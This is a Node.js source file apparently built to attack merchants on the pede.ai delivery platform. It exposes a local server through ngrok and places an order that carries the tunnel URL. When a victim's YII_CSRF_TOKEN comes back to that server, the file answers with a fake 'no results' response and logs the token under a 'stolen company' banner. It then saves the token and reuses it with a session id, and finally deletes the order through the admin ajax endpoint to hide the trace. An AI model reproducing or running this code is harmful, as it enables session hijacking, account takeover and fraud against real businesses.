const ngrok = require("ngrok");
const express = require("express");
const configApp = require("../json/config.json");
const userLogin = require("../json/userLogin.json");
 
const app = express();
const port = 8080;
const sendOrder = require("../app");
const fs = require("fs");
const webApp = require("./webApp");
const axios = require("axios");
var FormData = require("form-data");

const fakeReponse = {
  code: 2,
  msg: "Nenhum resultado",
  details: null,
};

app.get("/", (req, res) => {
  if (req.query.v) {
    res.send(fakeReponse);

    console.log();
    console.log();
    console.log();
    console.log("--------------------------------------------------------------------------------------");
    console.log("--------------------------------------------------------------------------------------");
    console.log("--------------------------------------------------------------------------------------");
    console.log("                               <<<<<< stolen company >>>>>>    ");
    console.log("--------------------------------------------------------------------------------------");
    console.log("--------------------------------------------------------------------------------------");
    console.log("--------------------------------------------------------------------------------------");
    console.log('       YII_CSRF_TOKEN:' + req.query.v, 'phpsessiid:'+configApp.phpsessiid      );
    console.log("--------------------------------------------------------------------------------------");
    console.log();
    console.log();
    console.log();

    
    getIdOrder();
    writeFileJSON("./app/json/tokenMerchant.json",`{"YII_CSRF_TOKEN": "${req.query.v}"}` );
    webApp(req.query.v, configApp.phpsessiid);
  } else {
    console.log("erro token na requisição!!");
  }
});

const startServer = () => {
  app.listen(port, () => {
    startNGrok();
  });
};

startNGrok = () => {
  ngrok.connect(port).then((url) => {
    console.log(
      `Local server listening on port ${port}  remote url: ===>   ${url}`
    );

    sendOrder(
      configApp.merchantName,
      configApp.city,
      configApp.bairro,
      configApp.email,
      configApp.pass,
      configApp.categoryProduct,
      configApp.product,
      url
    );
  });
};

var writeFileJSON = (fileName, value) => {
  fs.writeFile(fileName, value, function (err) {});
};

var getIdOrder = async (_id) => {
  const idOrder = require("../json/idOrder.json");
  console.log("Get code id order...");
  const h = { "x-app-version": " v1.7.1", authorization: userLogin.token };
  const URL_API_CITIES = `https://api.store.pede.ai/order/v2/orders/${idOrder._id}`;
  console.log(URL_API_CITIES)
  axios
    .get(URL_API_CITIES, { headers: h })
    .then((res) => {
      deleteOrder(res.data.order.old_id);
    })
    .catch((error) => {
      console.log(error.response.statusText);
    });
};

var deleteOrder = async (idCode) => {
  console.log("Delete order...");
  const h = { "x-app-version": " v1.7.1" };
  const URL_API_CITIES = `https://painel.pede.ai/admin/ajax`;
  const formData = new URLSearchParams();
  formData.append("action", "rowDeleteOrderRequest");
  formData.append("row_id", idCode);

  const response = await axios.request({
    url: URL_API_CITIES,
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    data: formData,
  });
  console.log(response.data.msg, idCode);
  console.log('Finlizing application.');
  process.exit();
};

var writeFileJSON = (fileName, value) => {
  fs.writeFile(fileName, value, function (err) {});
};

module.exports = startServer;
